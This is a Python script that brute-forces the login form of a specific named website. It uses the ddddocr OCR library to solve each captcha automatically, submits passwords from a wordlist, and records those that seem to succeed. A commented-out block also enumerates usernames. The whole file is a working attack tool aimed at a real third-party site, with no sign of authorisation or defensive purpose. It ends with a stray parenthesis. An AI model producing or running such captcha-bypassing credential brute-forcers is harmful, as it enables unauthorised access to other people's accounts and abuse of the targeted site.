import HackRequests
import ddddocr
import json
import time

raw = '''
Cookie: PHPSESSID=xxxxxx
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.zhwuye.zfbzhsq.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
'''



def getocr():
    global ocr1
    hack = HackRequests.hackRequests()
    url = "https://www.zhwuye.zfbzhsq.com/captcha.html?id=0.3942348275152363"
    hh = hack.http(url, headers=raw)
    ocr = ddddocr.DdddOcr()
    #ocr = ddddocr.DdddOcr(det=False, ocr=False, import_onnx_path="common.onnx", charsets_path="common.onnx")
    res = ocr.classification(hh.content())
    ocr1 = res
    return(res)
    
 
headers = '''
Cookie: PHPSESSID=xxxxxx
Content-Length: 40
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://www.zhwuye.zfbzhsq.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.zhwuye.zfbzhsq.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
'''
def check(username, ocr):
    print(username, ocr)
    post = "name=123&password={}&captcha={}".format(username,ocr)
    hack1 = HackRequests.hackRequests()

    hh = hack1.http(url = "https://www.zhwuye.zfbzhsq.com/",post=post,headers=headers)
    return(hh.text())
#print("ma:",getocr())
with open('username.txt', 'r') as f:
    tmp=f.readlines()
with open('password.txt', 'r') as f1:
    tmp1=f1.readlines()
#for name in tmp:
#    uname = name[:-1]
#    try:
#        res = check(uname, getocr())
#        if "52" not in res and "66" not in res:
#            print(res)
#    except:
#        pass

for passwd in tmp1:
    password = passwd[:-1]
    #while getocr().isdigit():
        
            #print(check(password, getocr()))
                
    res = check(password, getocr())     
    if "失败" not in res and "错误" not in res and "字母" not in res:
        print(res)
        with open('res1.txt','a') as f3:
            f3.write(password+"\n")
            f3.close()
    else:
        pass
    

)
